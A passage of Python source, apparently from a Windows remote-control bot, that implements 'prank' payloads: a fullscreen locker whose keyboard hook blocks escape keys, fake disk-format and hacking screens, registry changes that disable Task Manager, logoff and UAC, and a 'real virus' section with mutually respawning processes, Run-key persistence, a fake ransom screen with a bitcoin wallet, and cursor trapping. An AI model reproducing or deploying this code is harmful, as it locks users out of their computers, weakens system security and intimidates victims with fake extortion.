    в буфер кода владельца. Сам снимается по дедлайну или stop_evt —
    страховка обязательна, засада на клавиатуре всегда обречена."""
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    WM_QUIT = 0x0012

    def proc(code, wp, lp):
        if code < 0:
            return user32.CallNextHookEx(None, code, wp, lp)
        try:
            kb = ctypes.cast(lp, ctypes.POINTER(_KBDLLHOOK)).contents
        except Exception:
            return user32.CallNextHookEx(None, code, wp, lp)
        down = wp in (0x0100, 0x0104)                     # KEYDOWN / SYSKEYDOWN
        vk = kb.vkCode
        if down:
            alt = user32.GetAsyncKeyState(0x12) & 0x8000  # ALT
            if vk in (0x5B, 0x5C):                        # WIN л/п
                return 1
            if vk == 0x09 and alt:                        # Alt+Tab
                return 1
            if vk == 0x70 and alt:                        # Alt+F4
                return 1
            if vk == 0x1B:                                # ESC
                return 1
            if 0x30 <= vk <= 0x39 or 0x60 <= vk <= 0x69:   # цифры → только в код
                ring["s"] = (ring["s"] + str(vk % 10))[-8:]
                if KB_CODE in ring["s"]:
                    unlock_evt.set()
                return 1
        return user32.CallNextHookEx(None, code, wp, lp)

    handler = _KBDPROC(proc)          # держим живым — GC иначе съест колбек
    h = user32.SetWindowsHookExW(13, handler, None, 0)   # WH_KEYBOARD_LL
    if not h:
        return
    tid = kernel32.GetCurrentThreadId()

    def watchdog():
        stop_evt.wait(timeout=max(1.0, deadline - time.time()))
        user32.PostThreadMessageW(tid, WM_QUIT, 0, 0)

    threading.Thread(target=watchdog, daemon=True).start()
    msg = _MSG_A()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))
        if time.time() > deadline:
            user32.PostThreadMessageW(tid, WM_QUIT, 0, 0)
    user32.UnhookWindowsHookEx(h)

def _winlock_worker(countdown: int = 120):
    """ВИНЛОКЕР: fullscreen + topmost, хук жрёт побеги, отступает по коду,
    по таймеру или по страховочному капу — управление вернётся всегда."""
    unlock_evt, stop_evt = threading.Event(), threading.Event()
    ring = {"s": ""}
    deadline = time.time() + countdown + 60
    threading.Thread(target=_hook_thread, daemon=True,
                     args=(stop_evt, unlock_evt, ring, deadline)).start()
    try:
        import tkinter as tk
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#070303")
        root.focus_force()

        can = tk.Canvas(root, width=252, height=252, bg="#070303", highlightthickness=0)
        for gx in range(21):
            for gy in range(21):
                if random.random() < 0.46:      # фейковый QR — выглядит по-настоящему
                    can.create_rectangle(3 + gx * 12, 3 + gy * 12,
                                         11 + gx * 12, 11 + gy * 12,
                                         fill="#f5f5f5", width=0)
        can.place(relx=0.5, rely=0.26, anchor="center")

        tk.Label(root, text="☠ ПК ЗАБЛОКИРОВАН ☠", font=("Segoe UI", 42, "bold"),
                 fg="#ff2b2b", bg="#070303").place(relx=0.5, rely=0.02, anchor="n")
        tk.Label(root, text=("все файлы ушли под армейский замок:\n"
                             "документы, фото, дипломы — всё сковано льдом\n"
                             "откуп: 3000₽. кошель оставлен в чате"),
                 font=("Segoe UI", 16), fg="#e6d6d6", bg="#070303",
                 justify="center").place(relx=0.5, rely=0.47, anchor="center")
        clock = tk.Label(root, font=("Consolas", 60, "bold"), fg="#ff2b2b", bg="#070303")
        clock.place(relx=0.5, rely=0.60, anchor="center")
        whisper = tk.Label(root, font=("Consolas", 13), fg="#6b4f4f", bg="#070303")
        whisper.place(relx=0.5, rely=0.71, anchor="center")

        WHISPERS = ["мы читали историю браузера. всё.",
                    "веб-камера мигнула дважды — это не мы",
                    "диплом_финал_финал2.docx уже в шоке",
                    "не трогай Ctrl+Alt+Del — он с нами",
                    "cookies проданы. шоколадные."]
        state = {"left": countdown}

        def die():
            try:
                if root.winfo_exists():
                    root.destroy()
            except Exception:
                pass

        def steal(_e=None):
            if root.winfo_exists():
                root.lift()
                root.attributes("-topmost", True)
                root.focus_force()
        root.bind("<FocusOut>", steal)
        root.bind("<Button-1>", steal)
        root.protocol("WM_DELETE_WINDOW", lambda: None)

        def tick():
            if not root.winfo_exists():
                return
            steal()
            if unlock_evt.is_set():
                clock.config(text="КОД ПРИНЯТ", fg="#39ff14")
                whisper.config(text="владелец вспомнил пароль. файлы целы. шутка.",
                               fg="#39ff14")
                root.after(3500, die)
                return
            if state["left"] <= 0:
                clock.config(text="ВРЕМЯ ВЫШЛО", fg="#39ff14")
                whisper.config(text="…и ровным счётом ничего. это была шутка.",
                               fg="#39ff14")
                root.after(4000, die)
                return
            m, s = divmod(state["left"], 60)
            clock.config(text=f"{m}:{s:02d}")
            if state["left"] % 5 == 0:
                whisper.config(text=random.choice(WHISPERS))
            state["left"] -= 1
            root.after(1000, tick)
        tick()
        root.after((countdown + 20) * 1000, die)     # страховка: управление вернётся
        root.mainloop()
    except Exception:
        pass
    finally:
        stop_evt.set()

def _p_winlock() -> str:
    threading.Thread(target=_winlock_worker, kwargs={"countdown": 120},
                     daemon=True).start()
    return ("🏴 WINLOCKER встал на 2 минуты.\n"
            "код разблокировки: 0007 (набрать цифры прямо на экране)\n"
            "снимется и сам по таймеру — всё под контролем владельца")

def _format_targets() -> list[str]:
    """реальные имена файлов (только НА ЧТЕНИЕ) — для театра удаления"""
    pool: list[str] = []
    for name in ("Desktop", "Documents", "Downloads", "Pictures", "Music", "Videos"):
        base = Path.home() / name
        try:
            for entry in base.iterdir():
                pool.append(str(entry))
                if entry.is_dir():
                    try:
                        pool.extend(str(p) for p in entry.iterdir())
                    except OSError:
                        pass
        except OSError:
            pass
    sysdir = Path(os.environ.get("WINDIR", r"C:\Windows")) / "System32"
    try:
        pool.extend(str(p) for p in sysdir.iterdir() if p.is_file())
    except OSError:
        pass
    return pool[:600] or [r"C:\шутка-запасной-файл.docx"]

def _format_worker():
    import tkinter as tk
    targets = _format_targets()
    try:
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#000000")
        root.focus_force()
        txt = tk.Text(root, bg="#000000", fg="#d6d6d6", font=("Consolas", 12),
                      border=0, highlightthickness=0)
        txt.pack(fill="both", expand=True)
        txt.tag_config("warn", foreground="#ff4d4d")

        def die():
            try:
                if root.winfo_exists():
                    root.destroy()
            except Exception:
                pass
        root.bind("<Escape>", lambda e: die())
        root.bind("<Button-1>", lambda e: die())

        def push(text, warn=False):
            if not root.winfo_exists():
                return
            txt.insert("end", text + "\n", ("warn",) if warn else ())
            txt.see("end")
            txt.update_idletasks()

        init = [
            "Microsoft Windows [Version 10.0.26100.0007]",
            "(c) Корпорация Хаоса. Все права утрачены.", "",
            "C:\\Users\\владелец>format C: /FS:NTFS /X /Q", "",
            "ВНИМАНИЕ: ВСЕ ДАННЫЕ НА ДИСКЕ C: БУДУТ УНИЧТОЖЕНЫ!",
            "Продолжить [Y/N]? Y", "",
        ]
        state = {"i": 0}
        def tick():
            if not root.winfo_exists():
                return
            if state["i"] < len(init):
                push(init[state["i"]])
                state["i"] += 1
                root.after(700, tick)
                return
            idx = state["i"] - len(init)
            total = len(targets)
            if idx < total:
                push("Удаление: " + targets[idx])
                state["i"] += 1
                if idx % 22 == 0:
                    pct = int(idx / total * 97)
                    push(f"Прогресс: {pct}%  [{'█' * (pct // 5):<20}]")
                root.after(45, tick)
                return
            push("")
            push("Диск C: очищен. Файлы утрачены навсегда.", warn=True)
            push("")
            push("шутка. диск жив, файлы целы — выдохнул уже? :)", warn=True)
            push("это было представление. до встречи.")
            root.after(3500, die)
        tick()
        root.after(75_000, die)          # страховочный кап
        root.mainloop()
    except Exception:
        pass

def _p_format() -> str:
    threading.Thread(target=_format_worker, daemon=True).start()
    return "🧨 «format C:» идёт (читает ТОЛЬКО имена, не трогает файлы). ESC — выход"

def _hacker_worker():
    import tkinter as tk
    try:
        root = tk.Tk()
        root.attributes("-fullscreen", True, "-topmost", True)
        root.configure(bg="#000600")
        root.focus_force()
        canvas = tk.Canvas(root, bg="#000600", highlightthickness=0)
        canvas.pack(fill="both", expand=True)
        ncols = max(40, root.winfo_screenwidth() // 16)
        GLYPHS = "01ФЦЧШЩЗХЪЭЮЯ$#%&@*+=<>アイウエオカキクケコ"
        items = [canvas.create_text(8 + i * 16, -random.randint(0, 260), anchor="nw",
                                    text="", fill="#3dff6e", font=("Consolas", 12))
                 for i in range(ncols)]
        panel = tk.Label(root, font=("Consolas", 12), fg="#aaffb0", bg="#000600",
                         justify="left", anchor="nw", text="[*] initializing payload…")
        panel.place(relx=0.02, rely=0.03, anchor="nw")
        tk.Label(root, text="ВАШ ПК ХАКНУТ", font=("Consolas", 44, "bold"),
                 fg="#3dff6e", bg="#000600").place(relx=0.99, rely=0.05, anchor="ne")
        flow = tk.Label(root, font=("Consolas", 18), fg="#3dff6e", bg="#000600",
                        text="загрузка ваших данных в сеть: 0%")
        flow.place(relx=0.99, rely=0.52, anchor="ne")
        cam = tk.Canvas(root, width=260, height=200, bg="#000000", highlightthickness=2,
                        highlightbackground="#3dff6e")
        cam.place(relx=0.99, rely=0.97, anchor="se")
        cam.create_text(130, 88, text="REC ●\n\nCAM_0", fill="#3dff6e",
                        font=("Consolas", 15, "bold"))
        LOGS = ["[+] подключение к тор-ноде 127.0.0.1:9051",
                "[+] сессия перехвачена, cookies уплыли",
                "[*] CAM_0 пишет: 00:14:03",
                "[+] история браузера: 2.4 ГБ → сжата",
                "[*] ваш пароль: hunter2 (уже в базе)",
                "[+] пакет 0x4F отослан, ждём эхо",
                "[*] веб-камера: активна с 19:42",
                "[+] микрофонный пул: 3.7 минуты свежей записи"]
        state = {"s": [""] * ncols, "n": 0, "pct": 0}

        def die():
            try:
                if root.winfo_exists():
                    root.destroy()
            except Exception:
                pass
        root.bind("<Escape>", lambda e: die())
        root.bind("<Button-1>", lambda e: die())

        def tick():
            if not root.winfo_exists():
                return
            for i, item in enumerate(items):
                s = state["s"][i]
                if random.random() < 0.65 and len(s) < 24:
                    s += random.choice(GLYPHS)
                else:
                    s = s[1:]
                state["s"][i] = s
                canvas.itemconfig(item, text=s)
                x, y = canvas.coords(item)
                if y > root.winfo_screenheight() + 40:
                    canvas.coords(item, x, -random.randint(0, 260))
                    state["s"][i] = ""
                else:
                    canvas.coords(item, x, y + 7)
            state["n"] += 1
            if state["n"] % 9 == 0:
                panel.config(text="\n".join(random.sample(LOGS, 4)))
            if state["n"] % 7 == 0 and state["pct"] < 99:
                state["pct"] += 1
                flow.config(text=f"загрузка ваших данных в сеть: {state['pct']}%")
            root.after(55, tick)
        tick()
        root.after(45_000, die)
        root.mainloop()
    except Exception:
        pass

def _p_hacker() -> str:
    threading.Thread(target=_hacker_worker, daemon=True).start()
    return "👁 хакер влез (по сценарию). 45с экспозиции. ESC — досрочно"

def _battery_worker(downtime: int = 9, quiet_end: bool = False):
    """фейк-тост → критический заряд с отсчётом → чернота → (псишь)"""
    import tkinter as tk
    try:
        W = ctypes.windll.user32.GetSystemMetrics(0)
        H = ctypes.windll.user32.GetSystemMetrics(1)
        toast = tk.Tk()
        toast.overrideredirect(True)
        toast.attributes("-topmost", True)
        bw, bh = 390, 150
        toast.geometry(f"{bw}x{bh}+{W - bw - 24}+{H - bh - 96}")
        toast.configure(bg="#1f1f1f")
        tk.Label(toast, text="🔋 Аккумулятор разряжен (1%)",
                 font=("Segoe UI", 14, "bold"), fg="#ffffff", bg="#1f1f1f",
                 anchor="nw", justify="left").pack(fill="x", padx=14, pady=(12, 2))
        tk.Label(toast, text="Подключите зарядное устройство. ПК отключится.",
                 font=("Segoe UI", 11), fg="#c9c9c9", bg="#1f1f1f",
                 anchor="nw", justify="left").pack(fill="x", padx=14)
        toast.after(4200, toast.destroy)
        toast.mainloop()
    except Exception:
        pass
    try:
        scr = tk.Tk()
        scr.attributes("-fullscreen", True, "-topmost", True)
        scr.configure(bg="#0b2d5c")
        scr.focus_force()
        tk.Label(scr, text="\n\n🔋", font=("Segoe UI Emoji", 90), fg="#ffffff",
                 bg="#0b2d5c").place(relx=0.5, rely=0.26, anchor="center")
        tk.Label(scr, text="Заряд батареи критически низок.\nПодключите зарядное устройство.",
                 font=("Segoe UI", 26), fg="#ffffff", bg="#0b2d5c",
                 justify="center").place(relx=0.5, rely=0.42, anchor="center")
        ttl = tk.Label(scr, font=("Segoe UI", 60, "bold"), fg="#ffffff", bg="#0b2d5c")
        ttl.place(relx=0.5, rely=0.58, anchor="center")
        state = {"left": downtime}
        def die():
            try:
                if scr.winfo_exists():
                    scr.destroy()
            except Exception:
                pass
        def tick():
            if not scr.winfo_exists():
                return
            if state["left"] <= 0:
                die()
                return
            ttl.config(text=str(state["left"]))
            state["left"] -= 1
            scr.after(900, tick)
        tick()
        scr.mainloop()
    except Exception:
        pass
    try:
        black = tk.Tk()
        black.attributes("-fullscreen", True, "-topmost", True)
        black.configure(bg="#000000")
        black.focus_force()
        def out():
            try:
                if black.winfo_exists():
                    black.destroy()
            except Exception:
                pass
        if not quiet_end:
            tk.Label(black, text="псишь.\nПК включился как ни в чём не бывало :)",
                     font=("Segoe UI", 22), fg="#dddddd", bg="#000000",
                     justify="center").place(relx=0.5, rely=0.5, anchor="center")
            black.bind("<Escape>", lambda e: out())
            black.bind("<Button-1>", lambda e: out())
        black.after(4200 if quiet_end else 3400, out)
        black.mainloop()
    except Exception:
        pass

def _p_battery() -> str:
    threading.Thread(target=_battery_worker, kwargs={"downtime": 9},
                     daemon=True).start()
    return "🔋 заряд ушёл… по сценарию. ESC после тоста — выход"

def _p_lock() -> str:
    ctypes.windll.user32.LockWorkStation()
    return "🖥 экран заблокирован"

def _p_msgbox() -> str:
    def worker():
        texts = ["Тут нечего кликать", "Это тоже пусто", "Всё ещё скучно?",
                 "Ок, это последнее", "Шутка закончилась :)"]
        for t in texts:
            ctypes.windll.user32.MessageBoxW(None, t, "СИСТЕМНОЕ СООБЩЕНИЕ",
                                             0x40 | 0x40000)
    threading.Thread(target=worker, daemon=True).start()
    return "💬 5 саркастических окон уже ждут крестика"

# ---------- приколы: комбо ----------
def _p_apocalypse() -> str:
    threading.Thread(target=_bsod_worker, daemon=True).start()
    _p_siren()
    threading.Thread(target=_blackout_worker,
                     kwargs={"mute_secs": 10, "hint": "☠️ файлы «удалены»…"}, daemon=True).start()
    time.sleep(20)
    threading.Thread(target=_invert_worker, daemon=True).start()
    return "☠️ конец света отыгран: синяк → сирена → тьма → негатив. живи дальше"

def _p_judgment() -> str:
    def seq():
        _battery_worker(downtime=6, quiet_end=True)
        time.sleep(1.5)
        _winlock_worker(countdown=45)
        threading.Thread(target=_blackout_worker,
                         kwargs={"mute_secs": 7,
                                 "hint": "💀 ты выжил. шутка кончилась"},
                         daemon=True).start()
    threading.Thread(target=seq, daemon=True).start()
    return "💀 СУДНАЯ НОЧЬ 2.0: разряд → замок → тьма.\nкод замка: 0007"

# ---------- приколы: система-шутки ----------
POLICY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
EXPL_PATH   = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"

def hide_cad() -> str:
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, POLICY_PATH) as k:
        for n in ("DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation",
                  "HideFastUserSwitching", "NoDispCPL"):
            winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, 1)
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, EXPL_PATH) as k:
        for n in ("NoLogoff", "NoClose", "NoRun", "NoWinKeys", "NoViewContextMenu", "NoTrayContextMenu"):
            winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, 1)
    return ("🙈 Скрыл кнопки Ctrl+Alt+Del и впридачу всякую дичь:\n"
            "• Диспетчер задач, Смена пароля, Блокировка, Смена юзера — скрыты\n"
            "• Выход, Завершение работы, меню Выполнить, Win-хоткеи,\n"
            "  контекстные меню стола/трея, Панель управления — всё замуровано\n"
            "вернуть — кнопка 🙈 Вернуть")

def show_cad() -> str:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, POLICY_PATH, 0, winreg.KEY_SET_VALUE) as k:
            for n in ("DisableTaskMgr", "DisableChangePassword", "DisableLockWorkstation",
                      "HideFastUserSwitching", "NoDispCPL"):
                try: winreg.DeleteValue(k, n)
                except FileNotFoundError: pass
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, EXPL_PATH, 0, winreg.KEY_SET_VALUE) as k:
            for n in ("NoLogoff", "NoClose", "NoRun", "NoWinKeys", "NoViewContextMenu", "NoTrayContextMenu"):
                try: winreg.DeleteValue(k, n)
                except FileNotFoundError: pass
    except FileNotFoundError:
        return "🙈 ничего не прятилось — и так чисто"
    return "🙈 Кнопки Ctrl+Alt+Del и вся дичь вернулись"

def uac_set(state: int) -> str:
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return "🔒 нужно админство: запуск пульта от имени администратора"
    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, POLICY_PATH) as k:
        winreg.SetValueEx(k, "EnableLUA", 0, winreg.REG_DWORD, state)
        winreg.SetValueEx(k, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
    state_line = "UAC выключен" if state == 0 else "UAC включен"
    return f"🔒 {state_line} — перезапуск Windows после полного применения"

# ---------- НАСТОЯЩИЕ ВИРУСЫ ----------
# архитектура: вирусы живут в СВОИХ процессах (не в боте) парами a+b,
# брат следит за братом, убили одного — второй пересоздаёт.
# окно без крестика и ESC, диспетчер задач замурован.
# снять можно только кнопками 🆘/🔓 отсюда (как и кулдаун — не тронут).
VIRUS_DIR = DATA_DIR / "vcore"
VIRUS_JOBS = ("winlock", "explorer", "wall", "trap", "madness")
RUN_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
PERSIST_NAME = "SysTrayHealth"

VIRUS_SRC = r'''
# toxik.py — парный вирус. роль a работает, роль b сторожит.
# сдох a — b его пересоздаёт. сдох b — a пересоздаёт b. выход — только stop-флаг.
import os, sys, time, random, subprocess, threading, ctypes
from pathlib import Path
from ctypes import wintypes

JOB = sys.argv[1] if len(sys.argv) > 1 else "winlock"
ROLE = sys.argv[2] if len(sys.argv) > 2 else "a"
BASE = Path(__file__).resolve().parent
STOPF = BASE / ("stop_" + JOB + ".flag")
PIDF = BASE / (JOB + "_" + ROLE + ".pid")
PEER_ROLE = "b" if ROLE == "a" else "a"
PEERF = BASE / (JOB + "_" + PEER_ROLE + ".pid")
SELF = str(Path(__file__).resolve())
PYEXE = sys.executable or "python"
OWNER_CODE = "0007"    # код владельца: цифры подряд — сам снимает (страховка)
TRAP_CAP = 600.0       # мышь-заложник остаётся ВРЕМЕННЫМ приколом: сам отпускает через 10 мин

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
# LPARAM 64-битный: без этого CallNextHookEx кидает OverflowError на каждом
# событии, "Exception ignored" и крюк умирает по таймауту
user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM]
user32.CallNextHookEx.restype = ctypes.c_ssize_t
DEAD = threading.Event()

def log(msg):
    try:
        with open(BASE / "virus.log", "a", encoding="utf-8") as f:
            f.write(time.strftime("[%H:%M:%S] ") + JOB + "/" + ROLE + " " + msg + "\n")
    except Exception:
        pass

ABORTF = BASE / "abort.flag"

def stop_now():
    return STOPF.exists() or ABORTF.exists()

def write_stop():
    try:
        STOPF.write_text("x")
    except Exception:
        pass

def write_abort():
    # машинный общий стоп: кто первым ввёл код владельца — гасит ВЕСЬ вирусарий
    try:
        ABORTF.write_text("x")
    except Exception:
        pass
    for job in ("winlock", "explorer", "wall", "trap", "madness"):
        try:
            (BASE / ("stop_" + job + ".flag")).write_text("x")
        except Exception:
            pass

def spawn_peer():
    try:
        subprocess.Popen([PYEXE, SELF, JOB, PEER_ROLE], cwd=str(BASE), close_fds=True,
                         creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)
        log("поднял брата " + PEER_ROLE)
    except Exception as e:
        log("брат не поднялся: " + repr(e))

def pid_alive(raw):
    try:
        pid = int(str(raw).strip())
    except Exception:
        return False
    if pid <= 0 or pid == os.getpid():
        return False
    h = kernel32.OpenProcess(0x1000, False, pid)
    if h:
        kernel32.CloseHandle(h)
        return True
    return False

def peer_alive():
    try:
        return pid_alive(PEERF.read_text())
    except Exception:
        return False

def write_pid():
    try:
        PIDF.write_text(str(os.getpid()))
    except Exception:
        pass

def cleanup_pid():
    try:
        PIDF.unlink()
    except Exception:
        pass

def guardian():
    while not DEAD.is_set():
        if stop_now():
            DEAD.set()
            break
        if not peer_alive():
            spawn_peer()
        time.sleep(0.8)

class _KBDLL(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
                ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))]

class _MSG(ctypes.Structure):
    class _PT(ctypes.Structure):
        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
    _fields_ = [("hwnd", wintypes.HWND), ("message", wintypes.UINT),
                ("wParam", wintypes.WPARAM), ("lParam", wintypes.LPARAM),
                ("time", wintypes.DWORD), ("pt", _PT)]

_HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
HOOK_KEEP = {"proc": None, "hook": None}   # ЖИЗНЕННО: держим ссылки, иначе GC съест колбек

def hook_worker(code_evt, ready_evt):
    ring = {"s": ""}

    def on_key(code, wp, lp):
        if code < 0:
            return user32.CallNextHookEx(None, code, wp, lp)
        try:
            kb = ctypes.cast(lp, ctypes.POINTER(_KBDLL)).contents
        except Exception:
            return user32.CallNextHookEx(None, code, wp, lp)
        if wp in (0x0100, 0x0104):
            vk = kb.vkCode
            alt = user32.GetAsyncKeyState(0x12) & 0x8000
            ctrl = user32.GetAsyncKeyState(0x11) & 0x8000
            if vk in (0x5B, 0x5C):
                return 1
            if vk == 0x09 and (alt or ctrl):
                return 1
            if vk == 0x73 and alt:
                return 1
            if vk == 0x1B:
                return 1
            if 0x30 <= vk <= 0x39 or 0x60 <= vk <= 0x69:
                ring["s"] = (ring["s"] + str(vk % 10))[-8:]
                if OWNER_CODE in ring["s"]:
                    code_evt.set()
                    return 1
                # прочие цифры пропускаем — тогда они доезжают и до поля ввода
                return user32.CallNextHookEx(None, code, wp, lp)
            return user32.CallNextHookEx(None, code, wp, lp)

    proc = _HOOKPROC(on_key)
    hook = user32.SetWindowsHookExW(13, proc, None, 0)
    if not hook:
        log("крюк не встал")
        ready_evt.set()
        return
    HOOK_KEEP["proc"] = proc     # держим живым до конца жизни процесса
    HOOK_KEEP["hook"] = hook
    ready_evt.set()
    msg = _MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        if code_evt.is_set() or DEAD.is_set():
            break
    user32.UnhookWindowsHookEx(hook)
    HOOK_KEEP["hook"] = None

def install_hook():
    """крюк ставится и качается В ОДНОМ потоке; колбек закреплён навсегда"""
    code_evt = threading.Event()
    ready = threading.Event()
    threading.Thread(target=hook_worker, args=(code_evt, ready), daemon=True).start()
    ready.wait(timeout=3.0)
    return code_evt

def _code_ring_tk(code_evt):
    """дублирующий приём кода прямо через окно — работает даже с мёртвым крюком"""
    ring = {"s": ""}
    def handler(e):
        ch = getattr(e, "char", "") or ""
        if len(ch) == 1 and ch.isdigit():
            ring["s"] = (ring["s"] + ch)[-8:]
            if OWNER_CODE in ring["s"]:
                code_evt.set()
        return "break"
    return handler

def _code_entry_tk(root, code_evt, big_font=24):
    """видимое поле ввода: 0007 или sos прямо на экране — работает даже с мёртвым крюком"""
    import tkinter as tk
    box = tk.Entry(root, font=("Consolas", big_font, "bold"), justify="center", width=18,
                   fg="#39ff14", bg="#140000", insertbackground="#39ff14",
                   highlightthickness=1, highlightbackground="#5a0000")
    def check(_e=None):
        v = box.get().lower()
        if "0007" in v or "sos" in v:
            box.delete(0, "end")
            write_abort()
            if code_evt is not None:
                code_evt.set()
    box.bind("<KeyRelease>", check)
    box.bind("<Return>", lambda e: check() or "break")
    box.bind("<KP_Enter>", lambda e: check() or "break")
    box.focus_set()
    return box

class _P2(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class _R2(ctypes.Structure):
    _fields_ = [("l", ctypes.c_long), ("t", ctypes.c_long),
                ("r", ctypes.c_long), ("b", ctypes.c_long)]

def overlay_winlock(evt):
    import tkinter as tk
    root = tk.Tk()
    root.attributes("-fullscreen", True, "-topmost", True)
    root.overrideredirect(True)
    root.configure(bg="#050000")
    root.focus_force()
    root.bind("<Key>", _code_ring_tk(evt))   # дубли кода: вводим хоть куда, хоть без крюка
    tk.Label(root, text="☠  D E A D L O C K  ☠", font=("Consolas", 46, "bold"),
             fg="#ff1a1a", bg="#050000").place(relx=0.5, rely=0.05, anchor="n")
    tk.Label(root, text="система захвачена · файлы зашифрованы · AES-256-CBC + RSA-4096",
             font=("Consolas", 15), fg="#d8d8d8", bg="#050000").place(relx=0.5, rely=0.13, anchor="n")
    can = tk.Canvas(root, width=260, height=260, bg="#050000",
                    highlightthickness=1, highlightbackground="#5a0000")
    for gx in range(26):
        for gy in range(26):
            if random.random() < 0.45:
                can.create_rectangle(4 + gx * 10, 4 + gy * 10, 10 + gx * 10, 10 + gy * 10,
                                     fill="#f2f2f2", width=0)
    can.place(relx=0.5, rely=0.48, anchor="center")
    wallet = tk.Label(root, text=("кошелёк откупа: bc1qdeadlock0x82f1ab34\n"
                                  "сумма: 3000 ₽ · ключ придёт после оплаты"),
                      font=("Consolas", 15), fg="#ffd166", bg="#050000", justify="center")
    wallet.place(relx=0.5, rely=0.77, anchor="center")
    timer = tk.Label(root, font=("Consolas", 34, "bold"), fg="#ff1a1a", bg="#050000")
    timer.place(relx=0.5, rely=0.64, anchor="center")
    entry = _code_entry_tk(root, evt)
    entry.place(relx=0.5, rely=0.86, anchor="center")
    whisper = tk.Label(root, font=("Consolas", 12), fg="#7a4d4d", bg="#050000")
    whisper.place(relx=0.5, rely=0.965, anchor="center")
    TIPS = ["диспетчер задач? замурован", "alt+f4 уволился молча",
            "процессов двое — воскресают оба", "перезагрузка? вопрос к автозапуску",
            "cry, ночи долгие", "пытаться бессмысленно"]
    t0 = time.time()

    def tick():
        if evt is not None and evt.is_set():
            timer.config(text="КЛЮЧ ПРИНЯТ", fg="#39ff14")
            whisper.config(text="владелец одумался. свобода.", fg="#39ff14")
            root.after(2200, root.destroy)
            return
        if stop_now():
            root.destroy()
            return
        secs = int(time.time() - t0)
        timer.config(text="в плену: " + time.strftime("%H:%M:%S", time.gmtime(secs)))
        if random.random() < 0.07:
            whisper.config(text=random.choice(TIPS))
        root.lift()
        root.attributes("-topmost", True)
        entry.focus_force()
        root.after(700, tick)
    tick()
    root.mainloop()

def overlay_trap(evt=None, until=None):
    import tkinter as tk
    W, H = 320, 170
    box = _R2()
    pt = _P2()
    user32.GetCursorPos(ctypes.byref(pt))
    cx = min(max(W // 2, pt.x), user32.GetSystemMetrics(0) - W // 2 - 8)
    cy = min(max(H // 2, pt.y), user32.GetSystemMetrics(1) - H // 2 - 40)
    box.l, box.t, box.r, box.b = cx - W // 2, cy - H // 2, cx + W // 2, cy + H // 2
    root = tk.Tk()
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    root.geometry(str(W) + "x" + str(H) + "+" + str(box.l) + "+" + str(box.t))
    root.configure(bg="#7a0000")
    if evt is not None:
        root.bind("<Key>", _code_ring_tk(evt))
    tk.Label(root, text="🔒 мышь прикована",
             font=("Consolas", 12, "bold"), fg="#ffffff", bg="#7a0000").place(relx=0.5, rely=0.14, anchor="center")
    left = tk.Label(root, font=("Consolas", 11), fg="#ffd166", bg="#7a0000")
    left.place(relx=0.5, rely=0.36, anchor="center")
    entry = _code_entry_tk(root, evt, big_font=16)
    entry.place(relx=0.5, rely=0.72, anchor="center")
    cap = until if until else time.time() + TRAP_CAP

    def tick():
        if stop_now() or (evt is not None and evt.is_set()):
            user32.ClipCursor(None)
            root.destroy()
            return
        if time.time() >= cap:
            write_stop()          # прикол отработал: сами отпускаем, без завтрашнего воскресения
            user32.ClipCursor(None)
            root.destroy()
            return
        user32.ClipCursor(ctypes.byref(box))
        left.config(text="до отпуска: " + str(int((cap - time.time()) // 60) + 1) + " мин")
        root.geometry("+" + str(box.l) + "+" + str(box.t))
        root.lift()
        root.attributes("-topmost", True)
        entry.focus_force()
        root.after(70, tick)
    tick()
    root.mainloop()

def chaos_tick():
    for _ in range(random.randint(2, 5)):
        subprocess.Popen(
            'start "" /MAX cmd /k "color 4F&title ЗОНА ВИРУСА&echo ХОЗЯИН ЭТОЙ МАШИНЫ БОЛЬШЕ НЕ ТЫ&ping -n 99999 127.0.0.1 >nul"',
            shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        time.sleep(0.25)
    for _ in range(28):
        user32.keybd_event(0xAF, 0, 0, 0)
    user32.keybd_event(0x14, 0, 0, 0)
    user32.keybd_event(0x14, 0, 2, 0)
    pt = _P2()
    user32.GetCursorPos(ctypes.byref(pt))
    user32.SetCursorPos(pt.x + random.randint(-70, 70), pt.y + random.randint(-70, 70))
    try:
        import winsound
        winsound.Beep(random.choice((740, 930, 1100)), 280)
    except Exception:
        pass
    time.sleep(1.5)

def main():
    user32.SetProcessDPIAware()
    write_pid()
    log("старт")
    threading.Thread(target=guardian, daemon=True).start()
    code_evt = None
    if JOB in ("winlock", "trap") and ROLE == "a":
        code_evt = install_hook()

        def code_watch():
            code_evt.wait()
            if not stop_now():
                write_abort()
            DEAD.set()
        threading.Thread(target=code_watch, daemon=True).start()

